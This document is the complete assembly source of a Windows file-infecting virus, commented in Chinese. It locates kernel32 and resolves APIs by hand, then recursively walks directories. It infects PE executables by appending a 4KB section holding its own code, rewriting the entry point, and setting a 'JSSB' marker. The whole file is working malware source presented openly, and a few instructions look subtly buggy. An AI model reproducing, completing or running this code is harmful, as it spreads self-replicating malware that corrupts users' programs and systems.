
```asm
.386
.model flat,stdcall
option casemap:none

include windows.inc
;include kernel32.inc
;includelib kernel32.lib

.code


pApiname  db  'LoadLibraryA',0,'GetProcAddress',0,'FindFirstFileA',0,'FindNextFileA',0,'FindClose',0,\
      'CreateFileMappingA',0,'MapViewOfFile',0,'UnmapViewOfFile',0,'CloseHandle',0,'CreateFileA',0,\
      'lstrcpy',0,'lstrcat',0,

virusSize  dd  4096      ;;病毒大小(4KB)
infectPath  db  '.',0     ;;感染开始的根目录
infectTemppPath  db  256 dup(0)    ;;临时路径
infectFileType  db  '\*.\*',0    ;;文件类型
infectDivide  db  '\',0     ;;文件路径分隔符

fileinfo  WIN32_FIND_DATA  <>    ;;结构，用来保存查找到的文件的信息
removeFile  db  '.'     ;;排除.开头的文件名
oldEntryAddress  dd  ?     ;;源程序的入口点

apinum    dd  12     ;;保存所需要的 api 个数
kernal32base  dd  ?     ;;kernal32.dll 的基址
importrva  dd  ?     ;;kernal32.dll 的输出表地址
pLoadLibrary  dd  ?     ;;LoadLibrary 函数的地址
pGetProcAddress  dd  ?     ;;GetProcAddress 函数的地址
pFindFirstFile  dd  ?
pFindNextFile  dd  ?
pFindClose  dd  ?
pCreateFileMapping  dd  ?
pMapViewOfFile  dd  ?
pUnmapViewOfFile  dd  ?
pCloseHandle  dd  ?
pCreateFileA  dd  ?
plstrcpy  dd  ?
plstrcat  dd  ?


start:

 call Relocate
Relocate:         ;;重定位地址        
 pop ebp         ;;实现了重定位
 sub ebp,offset Relocate

 mov ecx,[esp]
 xor edx,edx
 and cx,0h       ;;取离 ecx 最近的整 10000h 地址
 

 lea eax,[ebp+offset SehOperator]
 push eax     
 assume fs:nothing      ;;启用 fs
 push fs:[0]
 mov fs:[0],esp
  
 call GetKernal32
  
 pop fs:[0]       ;;恢复原本的 FS
 add esp,4
  
 call SearchAPI     
 call FindFile
  
 jmp dword ptr [ebp+offset oldEntryAddress]
 ret
 

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


GetKernal32:         ;;取得 Kernal32.dll 基址
  
 mov edx,dword ptr [ecx+IMAGE_DOS_HEADER.e_lfanew]
 cmp ecx,dword ptr [ecx+edx+IMAGE_NT_HEADERS.OptionalHeader.ImageBase]
 jnz ExcuteHere
 push esi            ;;重定位操作
 lea esi,[ebp + offset kernal32base]
 mov DWORD PTR [esi],ecx
 pop esi
 ret
ExcuteHere:
 sub ecx,010000h
 jmp GetKernal32
   

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


SearchAPI:          ;;查找 API 函数
  
 
 mov edx,ecx        ;;此时 ecx 保存着 kernal32.dll 的基址
 mov eax,edx
 mov edx,[edx+IMAGE_DOS_HEADER.e_lfanew]
 lea eax,dword ptr [eax+edx+IMAGE_NT_HEADERS.OptionalHeader.DataDirectory]
 mov eax,[eax]
 add eax,ecx
 lea esi,[ebp + offset importrva]
 mov DWORD PTR [esi],eax      ;;以上代码找到 kernal32.dll 输出表
   

 sub esp,10h           ;;[esp]恢复函数名，[esp+4]已经成功搜索的 api 数，[esp+8]导出函数的索引序号基值,[esp+12]Kernal32.dll 输出函数的总数
 mov ebx,dword ptr [eax+IMAGE_EXPORT_DIRECTORY.nBase]
 mov [esp+8],ebx        ;;[esp+8]导出函数的索引序号基值
                         ;;ebx 输出函数的总数(控制循环次数)
                         ;;edi 指向 AddressOfNames
                         ;;esi 指向需要搜索的函数名数组
 lea esi,[ebp + offset pApiname]
 mov ebx,dword ptr [eax+IMAGE_EXPORT_DIRECTORY.NumberOfNames]
 mov dword ptr [esp+12],ebx          
@3:   
 mov ebx,[esp+12]
 lea eax,[ebp + offset importrva]
 mov eax,[eax]         
 mov edi,dword ptr [eax+IMAGE_EXPORT_DIRECTORY.AddressOfNames]
 mov eax,[ebp + offset kernal32base]
 lea edi,[edi+eax]
 xor edx,edx           ;;edx 存所要搜索函数在 AddressOfNames 数组的位置
@2:   
 mov ecx,edi           ;;ecx 指向具体函数名
 mov ecx,[ecx]
 mov eax,[ebp + offset kernal32base]
 lea ecx,[ecx+eax]
 xor eax,eax            ;;al 保存当前比较字符，ah 保存字符偏移
 

@1:
 mov al,byte ptr [ecx]
 test al,al
 jz success            ;;搜索成功
 cmp al,byte ptr [esi]
 jnz next              ;;逐个比较字符，不等着跳向下一个字符串
 inc ah               ;;ah 用来恢复所要搜索的函数的函数名
 inc esi
 inc ecx           
 jmp @1    
next:   
 dec ebx
 test ebx,ebx
 jz fail               ;;找不到所要搜索的函数，搜索失败
 inc edx
 add edi,4            ;;指向下一个输出表里输出的函数
 mov byte ptr [esp],ah
 sub esi,[esp]         ;;恢复函数名
 jmp @2
success:          
 inc esi             ;;esi 指向下一个要搜索的函数
 inc edx             ;;搜索到函数时函数索引值+1
                         ;;edi 指向 AddressOfNameOrdinals
 lea edi,[ebp + offset importrva]
 mov edi,[edi]         
 mov edi,dword ptr [edi+IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
 mov eax,[ebp + offset kernal32base]
 lea edi,[edi+eax]
 lea edi,dword ptr [edi+edx*2]
 mov ax,word ptr [edi]
 movzx eax,ax
 sub eax,[esp+8]        ;;函数索引值-导出表函数索引序号基值=真正函数索引值
 mov edi,eax
        ;;edx 指向 AddressOfFunctions
 lea edx,[ebp + offset importrva]
 mov edx,[edx]          
 mov edx,dword ptr [edx+IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
 mov eax,[ebp + offset kernal32base]
 lea edx,[edx+eax]
 lea edx,[edx+edi*4]
 mov edx,[edx]
 lea edx,[eax+edx]   
        ;;eax 指向保存函数指针的数组
 mov ebx,dword ptr [esp+4]     
 lea eax,[ebp + offset pLoadLibrary]
 lea eax,dword ptr [eax+ebx*4]
 mov dword ptr [eax],edx      ;;将 api 地址保存进数组
       
 inc ebx
 mov dword ptr [esp+4],ebx    ;;保存已经搜索出地址的 api 数
 lea eax,[ebp + offset apinum]
 mov eax,[eax]
 cmp eax,ebx
 jnz @3
 add esp,10h        ;;平衡堆栈
 ret
 

fail:
 add esp,10h
 ret
 

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 

 
SehOperator proc uses ebx pExcept:DWORD,pFramw:DWORD,pContext:DWORD,pDispatch:DWORD  ;;结构化异常处理程序(处理访问内存错误)
 

 mov eax,pContext
 Assume eax:ptr CONTEXT
 push esi
 mov esi,ebp  
 mov ebp,[eax].regEbp
 lea ebx,[ebp+offset ExcuteHere]    ;;处理完异常从这里开始执行
 mov ebp,esi
 pop esi
 mov [eax].regEip,ebx      ;;更改 EER 结构
 xor ebx,ebx
 mov [eax].iDr0,ebx
 mov [eax].iDr1,ebx
 mov [eax].iDr2,ebx
 mov [eax].iDr3,ebx
 mov [eax].iDr7,ebx
 mov eax,0
 ret
 

SehOperator endp  


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


FindFile:         ;;搜索文件模块
 

 sub esp,10h        ;;[esp]存放搜索文件时的文件句柄,[esp+4]存放内存映像文件句柄,[esp+8]存放文件内存映像起始地址
        ;;[esp+12]存放打开文件的文件句柄,[esp+16]存放当前程序所在目录
 sub esp,100h        ;;用来存放文件路径最长为 256
 

 lea ebx,dword ptr [ebp+offset fileinfo] 
 push ebx
 lea eax,dword ptr [ebp+offset infectPath]
 push eax
 lea eax,[esp+24]
 push eax
 call dword ptr [ebp+ offset plstrcpy]  ;;将目录路径拷贝到堆栈以备恢复
 lea eax,dword ptr [ebp+offset infectDivide]
 push eax
 lea eax,dword ptr [esp+24]
 push eax
 call dword ptr [ebp+ offset plstrcat]  ;;在目录后面加上\
 lea eax,dword ptr [ebp+offset infectFileType]
 push eax
 lea eax,dword ptr [ebp+offset infectPath]
 push eax
 call dword ptr [ebp+offset plstrcat]  ;;目录后加上\*.\*
 push eax
 call dword ptr [ebp+offset pFindFirstFile];调用 FindFirstFile 寻找文件        
 mov dword ptr [esp],eax
 cmp eax,INVALID_HANDLE_VALUE
 jnz @4    
 add esp,110h
 ret

@4:       
 lea edx,dword ptr [ebp+offset removeFile];保存.号的内存地址
 mov dl,byte ptr [edx]
 cmp dl,byte ptr [ebx+WIN32_FIND_DATA.cFileName]
 jz @5       ;;判断是否是.或者..,是则跳
 lea eax,[esp+16]
 push eax
 lea eax,dword ptr [ebp+offset infectPath]
 push eax
 call dword ptr [ebp+ offset plstrcpy]  ;;从堆栈将当前目录的路径拷贝到全局变量 infectPath
 mov ecx,dword ptr [ebx+WIN32_FIND_DATA.dwFileAttributes]
 cmp ecx,FILE_ATTRIBUTE_DIRECTORY
 jnz @7       ;;判断是目录还是文件，不是目录则跳(递归算法)
 lea ecx,dword ptr [ebx+WIN32_FIND_DATA.cFileName]  
 push ecx
 push eax
 call dword ptr [ebp+offset plstrcat]  ;;在有反斜杠的当前目录下加上要进入的目录
 call FindFile
 jmp @5
@7:   
 push NULL
 push FILE_ATTRIBUTE_NORMAL
 push OPEN_ALWAYS
 push NULL
 push FILE_SHARE_READ or FILE_SHARE_WRITE
 push GENERIC_WRITE or GENERIC_READ
 lea eax,dword ptr [ebx+WIN32_FIND_DATA.cFileName]
 push eax
 lea eax,dword ptr [ebp+offset infectPath]
 push eax
 call dword ptr [ebp+offset plstrcat]  ;;要打开的文件名+文件路径=文件绝对路径
 push eax
 call dword ptr [ebp+offset pCreateFileA];;调用 CreateFileA 函数打开 host 文件，返回文件句柄
 mov dword ptr [esp+12],eax
 
 push NULL
 mov edx,dword ptr [ebp+offset virusSize]
 add edx,dword ptr [ebx+WIN32_FIND_DATA.nFileSizeLow]
 push edx        ;;文件长度+病毒长度   
 push 0
 push PAGE_READWRITE
 push NULL
 push eax        ;;此时 eax 存放已打开文件的文件句柄
 call dword ptr [ebp+offset pCreateFileMapping]
        ;;调用 CreateFileMapping 函数
 mov dword ptr [esp+4],eax
 

 push edx
 push 0
 push 0
 push FILE_MAP_WRITE
 push eax        ;;调用 MapViewOfFile 函数将文件映射到内存中
 call dword ptr [ebp+offset pMapViewOfFile]
 mov dword ptr [esp+8],eax     
 
 mov esi,esi        ;;esi 指向文件在内存中的基址
 cmp word ptr [esi],'ZM'      
 jnz @6
 mov eax,dword ptr [esi+IMAGE_DOS_HEADER.e_lfanew]
 cmp word ptr [esi+eax],'EP'
 jnz @6
 cmp dword ptr [esi+64],'BSSJ'    ;;判断感染标志'JSSB'
 jz @6
 call InfectHost        ;;调用感染模块
 mov dword ptr [esi+64],'BSSJ'
 

@6:          
 mov  eax,dword ptr [esp+8]    ;;解除文件映射
 push eax
 call dword ptr [ebp+offset pUnmapViewOfFile]
 mov eax,dword ptr [esp+4]    ;;关闭内存映射文件
 push eax
 call dword ptr [ebp+offset pCloseHandle]
 mov eax,dword ptr [esp+12]    ;;关闭 HOST 文件
 push eax
 call dword ptr [ebp+offset pCloseHandle]
 jmp @5
 

@5:   
 mov eax,dword ptr [esp]
 push ebx
 push eax
 call dword ptr [ebp+offset pFindNextFile];;调用 FindNextFile 函数读取下一个文件           
 test eax,eax        ;;如果返回值为 0，说明没有文件了
 jnz @4       ;;不等于 0 继续循环搜索，等于 0 退出
 mov eax,dword ptr [esp]
 push eax
 call dword ptr [ebp+offset pFindClose]
 add esp,110h         
 ret
 

 

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


InfectHost:

 push ebx         
 push eax         
 sub esp,20h        ;;[esp]节对齐(内存中的对齐),[esp+4]文件对齐,[esp+8]host 文件最后一个结的大小
        ;;[esp+12]host 文件最后一个结的 RVA,[esp+16]host 文件最后一个结在文件中的大小,[esp+20]host 文件最后一个结在文件中的偏移
        ;;[esp+24]host 文件的程序入口地址的保存地址,[esp+28]host 文件基址
 mov ebx,dword ptr [esi+eax+IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment]
 mov dword ptr [esp],ebx
 mov ebx,dword ptr [esi+eax+IMAGE_NT_HEADERS.OptionalHeader.FileAlignment]
 mov dword ptr [esp+4],ebx
 mov ebx,dword ptr [esi+eax+IMAGE_NT_HEADERS.OptionalHeader.ImageBase]
 mov dword ptr [esp+28],ebx
 

 lea edi,dword ptr [esi+eax+IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
 mov [esp+24],edi
 mov edi,[edi]
 add edi,ebx
 mov dword ptr [ebp+offset oldEntryAddress],edi
 

 
 mov cx,word ptr [esi+eax+IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
 movzx ecx,cx
 lea edx,[esi+eax+IMAGE_NT_HEADERS.OptionalHeader]
 add ecx,edx        ;;ecx 保存节目录地址
         
 mov bx,word ptr [esi+eax+IMAGE_NT_HEADERS.FileHeader.NumberOfSections]          
         
 dec bx
 movzx eax,bx
 imul eax,28h
 add ecx,eax        ;;定位到最后一个节目录
 

 mov eax,dword ptr [ecx+IMAGE_SECTION_HEADER.Misc.VirtualSize]
 mov [esp+8],eax        ;;host 文件最后一个结的大小
 mov eax,dword ptr [ecx+IMAGE_SECTION_HEADER.VirtualAddress]
 mov [esp+12],eax      ;;host 文件最后一个结的 RVA
 mov eax,dword ptr [ecx+IMAGE_SECTION_HEADER.SizeOfRawData]
 mov [esp+16],eax      ;;host 文件最后一个结在文件中的大小
 mov eax,dword ptr [ecx+IMAGE_SECTION_HEADER.PointerToRawData]
 mov [esp+20],eax      ;;host 文件最后一个结在文件中的偏移
 

 add ecx,28h        ;;定位到新节目录位置
        ;;开始写入写数据
 mov dword ptr [ecx],'va.'     
 mov eax,dword ptr [ebp+offset virusSize]
 mov dword ptr [ecx+IMAGE_SECTION_HEADER.Misc.VirtualSize],eax
 mov eax,[esp+8]
 mov edi,1000h
 xor edx,edx
 div edi          ;;上节在内存中的开始偏移地址+(上节大小/节对齐+1)×节对齐=本节在内存中的开始偏移地址。
 test edx,edx
 jz @8        ;;如果 host 程序的最后一个节大大小刚好是 1000h 的整数倍，则直接写入新节
 inc ax   
@8:
 movzx eax,ax
 imul eax,1000h
 mov edx,[esp+12]
 add eax,edx
 mov dword ptr [ecx+IMAGE_SECTION_HEADER.VirtualAddress],eax
 push ecx
 mov edx,[esp+28]
 add eax,328h        ;;代码开始块
 mov dword ptr [edx],eax      ;;修改程序入口地址
 

 mov eax,[esp+20]
 mov edx,[esp+24]
 add eax,edx
 

 push esi
 mov ecx,4096        ;;病毒大小
 mov edi,eax
 add edi,esi       
 mov esi,401000h
 rep movsb        ;;拷贝病毒到 HOST 文件新建节 
 pop esi
 

 pop ecx
 mov dword ptr [ecx+IMAGE_SECTION_HEADER.PointerToRawData],eax
 mov dword ptr [ecx+IMAGE_SECTION_HEADER.SizeOfRawData],1000h
 mov dword ptr [ecx+IMAGE_SECTION_HEADER.Characteristics],0e0000020h
          ;;可读可写可执行节
 add esp,20h
 add bx,2        ;;节数+2
 pop eax
 mov word ptr [esi+eax+IMAGE_NT_HEADERS.FileHeader.NumberOfSections],bx
 mov ebx,dword ptr [esi+eax+IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage]
 add ebx,4096
 mov dword ptr [esi+eax+IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage],ebx
 pop ebx
 

 ret
 

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;   

 end  start
```
